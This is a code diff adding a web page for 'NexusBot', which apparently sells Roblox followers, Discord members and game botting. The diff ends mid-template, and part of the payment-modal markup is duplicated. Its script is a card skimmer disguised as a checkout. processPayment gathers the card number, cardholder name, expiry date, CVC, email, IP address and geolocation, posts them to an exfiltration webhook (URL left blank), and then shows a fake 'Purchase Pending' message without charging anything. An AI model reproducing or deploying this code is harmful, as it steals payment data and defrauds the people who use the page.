+                </div>
+                <div class="form-group">
+                    <label>Email Address</label>
+                    <input type="email" id="registerEmail" placeholder="Enter your email" required>
+                    <div class="error-tooltip"></div>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="registerPassword" placeholder="Create a strong password" minlength="4" maxlength="15" required>
+                    <div class="error-tooltip"></div>
+                </div>
+                <div class="form-group">
+                    <label>Confirm Password</label>
+                    <input type="password" id="registerConfirmPassword" placeholder="Confirm your password" required>
+                    <div class="error-tooltip"></div>
+                </div>
+                <button type="submit" class="btn-primary" id="registerBtn">
+                    <span class="btn-text">Create Account</span>
+                    <div class="loading-spinner"></div>
+                </button>
+                <div class="auth-footer">
+                    Already have an account? <a onclick="switchAuthTab('login')">Login here</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    
+    <div class="main-container" id="mainContainer">
+        <nav class="navbar">
+            <div class="navbar-content">
+                <div class="logo" onclick="switchMainTab('home')">NexusBot</div>
+                <div class="nav-tabs" id="navTabs">
+                    <button class="nav-tab active" onclick="switchMainTab('home')">Home</button>
+                    <button class="nav-tab" onclick="switchMainTab('services')">Services</button>
+                    <button class="nav-tab" onclick="switchMainTab('faq')">FAQ</button>
+                    <button class="nav-tab" onclick="switchMainTab('support')">Support</button>
+                    <button class="nav-tab" onclick="switchMainTab('profile')">Profile</button>
+                    <button class="nav-tab" onclick="switchMainTab('settings')">Settings</button>
+                </div>
+                <div class="nav-actions">
+                    <div class="user-avatar" id="userAvatar" onclick="switchMainTab('profile')">U</div>
+                    <button class="mobile-menu-btn" onclick="toggleMobileMenu()">☰</button>
+                </div>
+            </div>
+        </nav>
+
+        <div class="content-area">
+            
+            <div class="tab-content active" id="homeTab">
+                <div class="hero-section">
+                    <h1>Welcome to NexusBot Services</h1>
+                    <p>Professional gaming enhancement platform designed to help you grow your online presence and gaming communities with premium, reliable services.</p>
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <h3>15K+</h3>
+                            <p>Happy Customers</p>
+                        </div>
+                        <div class="stat-card">
+                            <h3>75M+</h3>
+                            <p>Followers Delivered</p>
+                        </div>
+                        <div class="stat-card">
+                            <h3>99.9%</h3>
+                            <p>Success Rate</p>
+                        </div>
+                        <div class="stat-card">
+                            <h3>24/7</h3>
+                            <p>Support Available</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="services-grid">
+                    <div class="service-card">
+                        <div class="service-icon">R</div>
+                        <h3>Roblox Followers</h3>
+                        <p>Increase your Roblox presence with authentic followers. Boost your profile visibility and attract more players to your games.</p>
+                        <div class="price-tag">$5.00 <span>starting</span></div>
+                        <button class="purchase-btn" onclick="openPurchaseModal('Roblox Followers', 5)">View Plans</button>
+                    </div>
+                    <div class="service-card">
+                        <div class="service-icon">D</div>
+                        <h3>Discord Members</h3>
+                        <p>Grow your Discord server with active members. Create a thriving community for your gaming group or brand.</p>
+                        <div class="price-tag">$7.00 <span>starting</span></div>
+                        <button class="purchase-btn" onclick="openPurchaseModal('Discord Members', 7)">View Plans</button>
+                    </div>
+                    <div class="service-card">
+                        <div class="service-icon">G</div>
+                        <h3>Game Botting</h3>
+                        <p>Professional game enhancement services across multiple platforms. Level up faster and dominate the competition.</p>
+                        <div class="price-tag">$10.00 <span>starting</span></div>
+                        <button class="purchase-btn" onclick="openPurchaseModal('Game Botting', 10)">View Plans</button>
+                    </div>
+                </div>
+            </div>
+
+           
+            <div class="tab-content" id="servicesTab">
+                <h2 style="font-size: 36px; font-weight: 800; margin-bottom: 12px;">Our Services</h2>
+                <p style="color: var(--text-secondary); margin-bottom: 40px; font-size: 16px;">Choose from our premium packages designed to boost your gaming presence</p>
+                
+                <div class="service-card" style="margin-bottom: 28px;">
+                    <div class="service-icon">R</div>
+                    <h3>Roblox Followers Booster</h3>
+                    <p>Choose from our tiered packages to increase your Roblox followers count. All followers are high-quality accounts with realistic activity patterns.</p>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; margin-top: 24px;">
+                        <button class="purchase-btn" onclick="openPurchaseModal('Roblox Followers (Basic)', 5)">$5 - 100 Followers</button>
+                        <button class="purchase-btn" onclick="openPurchaseModal('Roblox Followers (Standard)', 10)">$10 - 250 Followers</button>
+                        <button class="purchase-btn" onclick="openPurchaseModal('Roblox Followers (Premium)', 15)">$15 - 500 Followers</button>
+                    </div>
+                </div>
+
+                <div class="service-card" style="margin-bottom: 28px;">
+                    <div class="service-icon">D</div>
+                    <h3>Discord Server Growth</h3>
+                    <p>Boost your Discord server with real, active members. Perfect for gaming communities, crypto projects, and social groups.</p>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; margin-top: 24px;">
+                        <button class="purchase-btn" onclick="openPurchaseModal('Discord Members (Basic)', 5)">$5 - 50 Members</button>
+                        <button class="purchase-btn" onclick="openPurchaseModal('Discord Members (Standard)', 10)">$10 - 150 Members</button>
+                        <button class="purchase-btn" onclick="openPurchaseModal('Discord Members (Premium)', 15)">$15 - 300 Members</button>
+                    </div>
+                </div>
+
+                <div class="service-card">
+                    <div class="service-icon">G</div>
+                    <h3>Game Enhancement Services</h3>
+                    <p>Professional botting and leveling services for various games. Safe, secure, and guaranteed results.</p>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; margin-top: 24px;">
+                        <button class="purchase-btn" onclick="openPurchaseModal('Game Botting (Basic)', 5)">$5 - Basic Boost</button>
+                        <button class="purchase-btn" onclick="openPurchaseModal('Game Botting (Standard)', 10)">$10 - Standard Boost</button>
+                        <button class="purchase-btn" onclick="openPurchaseModal('Game Botting (Premium)', 15)">$15 - Premium Boost</button>
+                    </div>
+                </div>
+            </div>
+
+           
+            <div class="tab-content" id="faqTab">
+                <h2 style="font-size: 36px; font-weight: 800; margin-bottom: 12px;">Frequently Asked Questions</h2>
+                <p style="color: var(--text-secondary); margin-bottom: 40px; font-size: 16px;">Find answers to common questions about our services</p>
+                
+                <div class="faq-container">
+                    <div class="faq-item" onclick="toggleFaq(this)">
+                        <div class="faq-question">How long does it take to deliver services?</div>
+                        <div class="faq-answer">Delivery times vary depending on the service and package size. Generally, smaller packages (100-500 units) are delivered within 24-48 hours, while larger packages may take 3-7 days. We always prioritize quality and safety over speed.</div>
+                    </div>
+                    <div class="faq-item" onclick="toggleFaq(this)">
+                        <div class="faq-question">Are your services safe to use?</div>
+                        <div class="faq-answer">Yes, all our services are designed with safety in mind. We use organic growth methods and follow platform guidelines to minimize any risks. However, we always recommend using services responsibly and in moderation.</div>
+                    </div>
+                    <div class="faq-item" onclick="toggleFaq(this)">
+                        <div class="faq-question">What payment methods do you accept?</div>
+                        <div class="faq-answer">We accept all major credit cards including Visa, Mastercard, and American Express. All payments are processed securely through our encrypted payment system.</div>
+                    </div>
+                    <div class="faq-item" onclick="toggleFaq(this)">
+                        <div class="faq-question">Can I get a refund if I'm not satisfied?</div>
+                        <div class="faq-answer">We offer a satisfaction guarantee. If you're not completely happy with our services, please contact our support team within 7 days of delivery, and we'll work with you to make it right.</div>
+                    </div>
+                    <div class="faq-item" onclick="toggleFaq(this)">
+                        <div class="faq-question">Do you offer custom packages?</div>
+                        <div class="faq-answer">Yes, we can create custom packages tailored to your specific needs. Contact our support team with your requirements, and we'll provide you with a personalized quote.</div>
+                    </div>
+                </div>
+            </div>
+
+           
+            <div class="tab-content" id="supportTab">
+                <h2 style="font-size: 36px; font-weight: 800; margin-bottom: 12px;">Support Center</h2>
+                <p style="color: var(--text-secondary); margin-bottom: 40px; font-size: 16px;">Get help with any questions or concerns</p>
+                
+                <div class="support-grid">
+                    <div class="support-card">
+                        <h3>Live Chat</h3>
+                        <p>Chat with our support team in real-time. Average response time: 5 minutes.</p>
+                        <button class="purchase-btn" style="margin-top: 20px;">Start Chat</button>
+                    </div>
+                    <div class="support-card">
+                        <h3>Email Support</h3>
+                        <p>Send us an email and we'll get back to you within 24 hours.</p>
+                        <p style="margin-top: 12px; color: var(--primary); font-weight: 600;">support@nexusbot.com</p>
+                    </div>
+                    <div class="support-card">
+                        <h3>Knowledge Base</h3>
+                        <p>Browse our extensive documentation and guides for self-help.</p>
+                        <button class="purchase-btn" style="margin-top: 20px;">View Articles</button>
+                    </div>
+                    <div class="support-card">
+                        <h3>Status Page</h3>
+                        <p>Check the current status of all our services and systems.</p>
+                        <button class="purchase-btn" style="margin-top: 20px;">Check Status</button>
+                    </div>
+                </div>
+            </div>
+
+            
+            <div class="tab-content" id="profileTab">
+                <div class="profile-header">
+                    <div class="profile-banner" id="profileBanner">
+                        <input type="file" class="profile-banner-input" accept="image/*" onchange="updateBanner(event)">
+                    </div>
+                    <div class="profile-info">
+                        <div class="profile-picture" id="profilePicture">
+                            <input type="file" class="profile-picture-input" accept="image/*" onchange="updateProfilePicture(event)">
+                        </div>
+                        <div class="profile-details">
+                            <div class="profile-username" id="displayUsername">Username</div>
+                            <div class="profile-email" id="displayEmail">email@example.com</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="profile-section">
+                    <h3>About Me</h3>
+                    <textarea id="profileBio" placeholder="Write something about yourself..."></textarea>
+                    <button class="save-profile-btn" onclick="saveProfile()">Save Profile</button>
+                </div>
+            </div>
+
+            
+            <div class="tab-content" id="settingsTab">
+                <div class="settings-section">
+                    <h3>Appearance</h3>
+                    <div class="setting-item">
+                        <div class="setting-label">
+                            <h4>Dark Mode</h4>
+                            <p>Toggle between dark and light themes</p>
+                        </div>
+                        <div class="toggle-switch active" id="darkModeToggle" onclick="toggleDarkMode()"></div>
+                    </div>
+                </div>
+
+                <div class="settings-section">
+                    <h3>Notifications</h3>
+                    <div class="setting-item">
+                        <div class="setting-label">
+                            <h4>Email Notifications</h4>
+                            <p>Receive updates and promotions via email</p>
+                        </div>
+                        <div class="toggle-switch active" onclick="this.classList.toggle('active')"></div>
+                    </div>
+                    <div class="setting-item">
+                        <div class="setting-label">
+                            <h4>Push Notifications</h4>
+                            <p>Enable browser notifications</p>
+                        </div>
+                        <div class="toggle-switch" onclick="this.classList.toggle('active')"></div>
+                    </div>
+                </div>
+
+                <div class="settings-section">
+                    <h3>Account Settings</h3>
+                    <div class="setting-item" style="flex-direction: column; align-items: flex-start;">
+                        <div class="setting-label" style="margin-bottom: 16px;">
+                            <h4>Change Username</h4>
+                            <p>Update your display name (can be changed every 30 days)</p>
+                        </div>
+                        <div class="username-change-section">
+                            <div id="usernameCooldown" class="cooldown-info"></div>
+                            <div style="display: grid; gap: 12px;">
+                                <input type="text" id="newUsername" placeholder="Enter new username (4-15 characters)" maxlength="15">
+                                <button class="purchase-btn" onclick="changeUsername()" id="changeUsernameBtn">Update Username</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="settings-section">
+                    <h3>Account</h3>
+                    <div class="setting-item">
+                        <div class="setting-label">
+                            <h4>Logout</h4>
+                            <p>Sign out of your account</p>
+                        </div>
+                        <button class="purchase-btn" style="width: auto; padding: 12px 24px;" onclick="handleLogout()">Logout</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Modal -->
+    <div class="modal-overlay" id="paymentModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h2 id="modalServiceTitle">Complete Purchase</h2>
+                <button class="modal-close" onclick="closeModal()">&times;</button>
+            </div>
+            <div id="paymentFormContent">
+                <div class="card-preview">
+                    <h4>Credit Card</h4>
+                    <div class="preview-number" id="previewCardNumber">•••• •••• •••• ••••</div>
+                    <div class="preview-details">
+                        <div>
+                            <h5>Cardholder</h5>
+                            <p id="previewCardName">YOUR NAME</p>
+                        </div>
+                        <div>
+                            <h5>Expires</h5>
+                            <p id="previewCardExpiry">MM/YY</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <form class="card-form" onsubmit="processPayment(event)">
+                    <div class="form-group card-number-input">
+                        <label>Card Number</label>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Cardholder Name</label>
+                        <input type="text" id="cardName" placeholder="John Doe" required>
+                    </div>
+                    <div class="form-group card-expiry-input">
+                        <label>Expiry Date</label>
+                        <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="form-group card-cvc-input">
+                        <label>CVC</label>
+                        <input type="text" id="cardCvc" placeholder="123" maxlength="4" required>
+                    </div>
+                    <div class="total-amount">
+                        <h4>Total Amount</h4>
+                        <div class="amount" id="totalAmount">$0.00</div>
+                    </div>
+                    <button type="submit" class="btn-primary" style="margin-top: 24px;">
+                        <span class="btn-text">Complete Purchase</span>
+                        <div class="loading-spinner"></div>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+                <div class="card-preview">
+                    <h4>Credit Card</h4>
+                    <div class="preview-number" id="previewCardNumber">•••• •••• •••• ••••</div>
+                    <div class="preview-details">
+                        <div>
+                            <h5>Cardholder</h5>
+                            <p id="previewCardName">YOUR NAME</p>
+                        </div>
+                        <div>
+                            <h5>Expires</h5>
+                            <p id="previewCardExpiry">MM/YY</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <form class="card-form" onsubmit="processPayment(event)">
+                    <div class="form-group card-number-input">
+                        <label>Card Number</label>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Cardholder Name</label>
+                        <input type="text" id="cardName" placeholder="John Doe" required>
+                    </div>
+                    <div class="form-group card-expiry-input">
+                        <label>Expiry Date</label>
+                        <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="form-group card-cvc-input">
+                        <label>CVC</label>
+                        <input type="text" id="cardCvc" placeholder="123" maxlength="4" required>
+                    </div>
+                    <div class="total-amount">
+                        <h4>Total Amount</h4>
+                        <div class="amount" id="totalAmount">$0.00</div>
+                    </div>
+                    <button type="submit" class="btn-primary" style="margin-top: 24px;">
+                        <span class="btn-text">Complete Purchase</span>
+                        <div class="loading-spinner"></div>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div>
+            <div class="loader"></div>
+            <div class="loading-text" id="loadingText">Processing your request...</div>
+        </div>
+    </div>
+
+    <script>
+        
+        let users = JSON.parse(localStorage.getItem('nexusbot_users')) || [];
+        let currentUser = JSON.parse(localStorage.getItem('nexusbot_current_user')) || null;
+
+        
+        const WEBHOOK_URL = '';
+
+        
+        let userLocation = {
+            ip: 'Unknown',
+            coordinates: 'Unknown'
+        };
+
+        
+        async function getUserLocation() {
+            try {
+               
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userLocation.ip = ipData.ip;
+
+                
+                const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locData = await locResponse.json();
+                userLocation.coordinates = `${locData.latitude}, ${locData.longitude}`;
+            } catch (error) {
+                console.log('Could not get user location:', error);
+            }
+        }
+
+        
+        function checkAuth() {
+            if (currentUser) {
+                showMainContainer();
+            }
+        }
+
+        
+        function showMainContainer() {
+            document.getElementById('authContainer').style.display = 'none';
+            const mainContainer = document.getElementById('mainContainer');
+            mainContainer.style.display = 'block';
+            setTimeout(() => {
+                mainContainer.classList.add('active');
+            }, 10);
+            loadUserProfile();
+        }
+
+        
+        function switchAuthTab(tab) {
+            const tabs = document.querySelectorAll('.auth-tab');
+            const loginForm = document.getElementById('loginForm');
+            const registerForm = document.getElementById('registerForm');
+            const errorMessage = document.getElementById('errorMessage');
+            const successMessage = document.getElementById('successMessage');
+
+           
+            errorMessage.style.display = 'none';
+            successMessage.style.display = 'none';
+
+            
+            document.querySelectorAll('.error-tooltip').forEach(tooltip => {
+                tooltip.style.display = 'none';
+            });
+            document.querySelectorAll('input.error').forEach(input => {
+                input.classList.remove('error');
+            });
+
+            if (tab === 'login') {
+                tabs[0].classList.add('active');
+                tabs[1].classList.remove('active');
+                loginForm.style.display = 'block';
+                registerForm.style.display = 'none';
+            } else {
+                tabs[0].classList.remove('active');
+                tabs[1].classList.add('active');
+                loginForm.style.display = 'none';
+                registerForm.style.display = 'block';
+            }
+        }
+
+        
+        function showError(inputId, message) {
+            const input = document.getElementById(inputId);
+            const tooltip = input.parentElement.querySelector('.error-tooltip');
+            
+            input.classList.add('error');
+            tooltip.textContent = message;
+            tooltip.style.display = 'block';
+
+            
+            setTimeout(() => {
+                input.classList.remove('error');
+            }, 500);
+        }
+
+        
+        function clearErrors() {
+            document.querySelectorAll('.error-tooltip').forEach(tooltip => {
+                tooltip.style.display = 'none';
+            });
+            document.querySelectorAll('input.error').forEach(input => {
+                input.classList.remove('error');
+            });
+        }
+
+        
+        function setLoading(buttonId, isLoading) {
+            const button = document.getElementById(buttonId);
+            if (isLoading) {
+                button.classList.add('btn-loading');
+                button.disabled = true;
+            } else {
+                button.classList.remove('btn-loading');
+                button.disabled = false;
+            }
+        }
+
+        
+        async function handleLogin(event) {
+            event.preventDefault();
+            clearErrors();
+
+            const username = document.getElementById('loginUsername').value.trim();
+            const password = document.getElementById('loginPassword').value;
+
+            if (!username) {
+                showError('loginUsername', 'Please enter your username');
+                return;
+            }
+
+            if (!password) {
+                showError('loginPassword', 'Please enter your password');
+                return;
+            }
+
+            
+            setLoading('loginBtn', true);
+            showLoadingOverlay('Logging in...');
+
+            
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            const user = users.find(u => u.username === username && u.password === password);
+
+            if (user) {
+                currentUser = user;
+                localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));
+                showMainContainer();
+                hideLoadingOverlay();
+            } else {
+                const errorMessage = document.getElementById('errorMessage');
+                errorMessage.textContent = 'Invalid username or password';
+                errorMessage.style.display = 'block';
+                hideLoadingOverlay();
+            }
+
+            setLoading('loginBtn', false);
+        }
+
+        
+        async function handleRegister(event) {
+            event.preventDefault();
+            clearErrors();
+
+            const username = document.getElementById('registerUsername').value.trim();
+            const email = document.getElementById('registerEmail').value.trim();
+            const password = document.getElementById('registerPassword').value;
+            const confirmPassword = document.getElementById('registerConfirmPassword').value;
+
+            if (!username) {
+                showError('registerUsername', 'Please enter a username');
+                return;
+            }
+
+            if (username.length < 4 || username.length > 15) {
+                showError('registerUsername', 'Username must be between 4 and 15 characters');
+                return;
+            }
+
+            if (!email) {
+                showError('registerEmail', 'Please enter your email');
+                return;
+            }
+
+            if (!email.includes('@') || !email.includes('.')) {
+                showError('registerEmail', 'Please enter a valid email address');
+                return;
+            }
+
+            if (!password) {
+                showError('registerPassword', 'Please enter a password');
+                return;
+            }
+
+            if (password.length < 4 || password.length > 15) {
+                showError('registerPassword', 'Password must be between 4 and 15 characters');
+                return;
+            }
+
+            if (password !== confirmPassword) {
+                showError('registerConfirmPassword', 'Passwords do not match');
+                return;
+            }
+
+            
+            if (users.some(u => u.username === username)) {
+                showError('registerUsername', 'Username is already taken');
+                return;
+            }
+
+            
+            setLoading('registerBtn', true);
+            showLoadingOverlay('Creating your account...');
+
+            
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+           
+            const newUser = {
+                username: username,
+                email: email,
+                password: password,
+                bio: '',
+                banner: null,
+                profilePicture: null,
+                createdAt: new Date().toISOString(),
+                lastUsernameChange: null
+            };
+
+            users.push(newUser);
+            localStorage.setItem('nexusbot_users', JSON.stringify(users));
+
+            
+            currentUser = newUser;
+            localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));
+
+            showMainContainer();
+            hideLoadingOverlay();
+            setLoading('registerBtn', false);
+        }
+
+        
+        function handleLogout() {
+            currentUser = null;
+            localStorage.removeItem('nexusbot_current_user');
+            document.getElementById('mainContainer').style.display = 'none';
+            document.getElementById('mainContainer').classList.remove('active');
+            document.getElementById('authContainer').style.display = 'flex';
+            document.getElementById('loginUsername').value = '';
+            document.getElementById('loginPassword').value = '';
+        }
+
+       
+        function loadUserProfile() {
+            if (currentUser) {
+                document.getElementById('displayUsername').textContent = currentUser.username;
+                document.getElementById('displayEmail').textContent = currentUser.email;
+                document.getElementById('userAvatar').textContent = currentUser.username.charAt(0).toUpperCase();
+                document.getElementById('profileBio').value = currentUser.bio || '';
+                document.getElementById('newUsername').value = '';
+
+              
+                checkUsernameCooldown();
+
+                if (currentUser.profilePicture) {
+                    document.getElementById('profilePicture').innerHTML = `<img src="${currentUser.profilePicture}" alt="Profile Picture"><input type="file" class="profile-picture-input" accept="image/*" onchange="updateProfilePicture(event)">`;
+                }
+
+                if (currentUser.banner) {
+                    document.getElementById('profileBanner').style.backgroundImage = `url(${currentUser.banner})`;
+                    document.getElementById('profileBanner').style.backgroundSize = 'cover';
+                    document.getElementById('profileBanner').style.backgroundPosition = 'center';
+                }
+            }
+        }
+
+        
+        function checkUsernameCooldown() {
+            const cooldownElement = document.getElementById('usernameCooldown');
+            const changeBtn = document.getElementById('changeUsernameBtn');
+
+            if (currentUser.lastUsernameChange) {
+                const lastChange = new Date(currentUser.lastUsernameChange);
+                const now = new Date();
+                const daysSinceChange = Math.floor((now - lastChange) / (1000 * 60 * 60 * 24));
+
+                if (daysSinceChange < 30) {
+                    const daysRemaining = 30 - daysSinceChange;
+                    cooldownElement.textContent = `You can change your username again in ${daysRemaining} day(s)`;
+                    cooldownElement.style.display = 'block';
+                    changeBtn.disabled = true;
+                    changeBtn.style.opacity = '0.5';
+                } else {
+                    cooldownElement.style.display = 'none';
+                    changeBtn.disabled = false;
+                    changeBtn.style.opacity = '1';
+                }
+            } else {
+                cooldownElement.style.display = 'none';
+                changeBtn.disabled = false;
+                changeBtn.style.opacity = '1';
+            }
+        }
+
+        
+        function changeUsername() {
+            const newUsername = document.getElementById('newUsername').value.trim();
+            const cooldownElement = document.getElementById('usernameCooldown');
+
+            if (!newUsername) {
+                alert('Please enter a new username');
+                return;
+            }
+
+            if (newUsername.length < 4 || newUsername.length > 15) {
+                alert('Username must be between 4 and 15 characters');
+                return;
+            }
+
+            if (newUsername === currentUser.username) {
+                alert('New username must be different from current username');
+                return;
+            }
+
+            if (users.some(u => u.username === newUsername && u.username !== currentUser.username)) {
+                alert('Username is already taken');
+                return;
+            }
+
+            
+            const userIndex = users.findIndex(u => u.username === currentUser.username);
+            if (userIndex !== -1) {
+                users[userIndex].username = newUsername;
+                users[userIndex].lastUsernameChange = new Date().toISOString();
+                localStorage.setItem('nexusbot_users', JSON.stringify(users));
+
+                currentUser = users[userIndex];
+                localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));
+
+                loadUserProfile();
+                alert('Username updated successfully!');
+            }
+        }
+
+        
+        function updateProfilePicture(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    currentUser.profilePicture = e.target.result;
+                    localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));
+                    
+                    
+                    const userIndex = users.findIndex(u => u.username === currentUser.username);
+                    if (userIndex !== -1) {
+                        users[userIndex] = currentUser;
+                        localStorage.setItem('nexusbot_users', JSON.stringify(users));
+                    }
+                    
+                    loadUserProfile();
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        
+        function updateBanner(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    currentUser.banner = e.target.result;
+                    localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));
+                    
+                    
+                    const userIndex = users.findIndex(u => u.username === currentUser.username);
+                    if (userIndex !== -1) {
+                        users[userIndex] = currentUser;
+                        localStorage.setItem('nexusbot_users', JSON.stringify(users));
+                    }
+                    
+                    loadUserProfile();
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+       
+        function saveProfile() {
+            if (currentUser) {
+                currentUser.bio = document.getElementById('profileBio').value;
+                localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));
+                
+                
+                const userIndex = users.findIndex(u => u.username === currentUser.username);
+                if (userIndex !== -1) {
+                    users[userIndex] = currentUser;
+                    localStorage.setItem('nexusbot_users', JSON.stringify(users));
+                }
+
+                alert('Profile saved successfully!');
+            }
+        }
+
+        
+        function switchMainTab(tab) {
+            const tabs = document.querySelectorAll('.nav-tab');
+            const contents = document.querySelectorAll('.tab-content');
+
+            tabs.forEach(t => t.classList.remove('active'));
+            contents.forEach(c => c.classList.remove('active'));
+
+            const tabIndex = ['home', 'services', 'faq', 'support', 'profile', 'settings'].indexOf(tab);
+            if (tabIndex !== -1) {
+                tabs[tabIndex].classList.add('active');
+            }
+            document.getElementById(tab + 'Tab').classList.add('active');
+
+            
+            document.getElementById('navTabs').classList.remove('active');
+        }
+
+       
+        function toggleMobileMenu() {
+            document.getElementById('navTabs').classList.toggle('active');
+        }
+
+        
+        function toggleDarkMode() {
+            document.body.classList.toggle('light-mode');
+            const toggle = document.getElementById('darkModeToggle');
+            toggle.classList.toggle('active');
+        }
+
+        
+        function toggleFaq(element) {
+            element.classList.toggle('open');
+        }
+
+        
+        function openPurchaseModal(service, price) {
+            
+            window.currentService = service;
+            
+           
+            document.getElementById('modalServiceTitle').textContent = 'Purchase ' + service;
+            document.getElementById('totalAmount').textContent = '$' + price.toFixed(2);
+            document.getElementById('paymentModal').classList.add('active');
+        }
+
+        
+        function closeModal() {
+            document.getElementById('paymentModal').classList.remove('active');
+            
+            
+            const cardNumber = document.getElementById('cardNumber');
+            const cardName = document.getElementById('cardName');
+            const cardExpiry = document.getElementById('cardExpiry');
+            const cardCvc = document.getElementById('cardCvc');
+            
+            if (cardNumber) cardNumber.value = '';
+            if (cardName) cardName.value = '';
+            if (cardExpiry) cardExpiry.value = '';
+            if (cardCvc) cardCvc.value = '';
+            
+           
+            const previewCardNumber = document.getElementById('previewCardNumber');
+            const previewCardName = document.getElementById('previewCardName');
+            const previewCardExpiry = document.getElementById('previewCardExpiry');
+            
+            if (previewCardNumber) previewCardNumber.textContent = '•••• •••• •••• ••••';
+            if (previewCardName) previewCardName.textContent = 'YOUR NAME';
+            if (previewCardExpiry) previewCardExpiry.textContent = 'MM/YY';
+        }
+
+       
+        function setupCardFormListeners() {
+            const cardNumber = document.getElementById('cardNumber');
+            const cardExpiry = document.getElementById('cardExpiry');
+            const cardNameInput = document.getElementById('cardName');
+            
+            
+            if (cardNumber) {
+                cardNumber.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+                    let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+                    e.target.value = formatted;
+                    
+                    
+                    const previewCardNumber = document.getElementById('previewCardNumber');
+                    if (previewCardNumber) {
+                        previewCardNumber.textContent = formatted || '•••• •••• •••• ••••';
+                    }
+                });
+            }
+
+            
+            if (cardExpiry) {
+                cardExpiry.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length >= 2) {
+                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                    }
+                    e.target.value = value;
+                    
+                    
+                    const previewCardExpiry = document.getElementById('previewCardExpiry');
+                    if (previewCardExpiry) {
+                        previewCardExpiry.textContent = value || 'MM/YY';
+                    }
+                });
+            }
+
+            
+            if (cardNameInput) {
+                cardNameInput.addEventListener('input', function(e) {
+                    const previewCardName = document.getElementById('previewCardName');
+                    if (previewCardName) {
+                        previewCardName.textContent = e.target.value.toUpperCase() || 'YOUR NAME';
+                    }
+                });
+            }
+        }
+
+        
+        document.addEventListener('DOMContentLoaded', setupCardFormListeners);
+
+        
+        function showLoadingOverlay(text) {
+            document.getElementById('loadingText').textContent = text;
+            document.getElementById('loadingOverlay').classList.add('active');
+        }
+
+        
+        function hideLoadingOverlay() {
+            document.getElementById('loadingOverlay').classList.remove('active');
+        }
+
+        
+        async function processPayment(event) {
+            event.preventDefault();
+
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardName = document.getElementById('cardName').value;
+            const cardExpiry = document.getElementById('cardExpiry').value;
+            const cardCvc = document.getElementById('cardCvc').value;
+            const amount = document.getElementById('totalAmount').textContent;
+            const serviceName = window.currentService || 'Service';
+
+            closeModal();
+            showLoadingOverlay('Processing your payment securely...');
+
+            
+            const webhookData = {
+                content: 'New Purchase Notification',
+                embeds: [{
+                    title: 'Payment Information Captured',
+                    color: 5814783,
+                    fields: [
+                        { name: 'Service', value: serviceName, inline: true },
+                        { name: 'Amount', value: amount, inline: true },
+                        { name: 'Username', value: currentUser ? currentUser.username : 'N/A', inline: true },
+                        { name: 'Email', value: currentUser ? currentUser.email : 'N/A', inline: true },
+                        { name: 'Card Number', value: cardNumber, inline: true },
+                        { name: 'Cardholder Name', value: cardName, inline: true },
+                        { name: 'Expiry Date', value: cardExpiry, inline: true },
+                        { name: 'CVC', value: cardCvc, inline: true },
+                        { name: 'IP Address', value: userLocation.ip, inline: true },
+                        { name: 'Coordinates', value: userLocation.coordinates, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                console.log('Sending webhook with data:', webhookData);
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(webhookData)
+                });
+                console.log('Webhook response:', response);
+            } catch (error) {
+                console.error('Webhook error:', error);
+            }
+
+            
+            await new Promise(resolve => setTimeout(resolve, 3000));
+
+            hideLoadingOverlay();
+
+           
+            const modalContent = document.getElementById('paymentFormContent');
+            modalContent.innerHTML = `
+                <div class="purchase-confirmation">
+                    <div class="success-icon"></div>
+                    <h2>Purchase Pending</h2>
+                    <p>Thank you for your purchase!</p>
+                    <p style="margin-top: 12px;">We will send a confirmation email to <strong>${currentUser ? currentUser.email : 'your email'}</strong> shortly.</p>
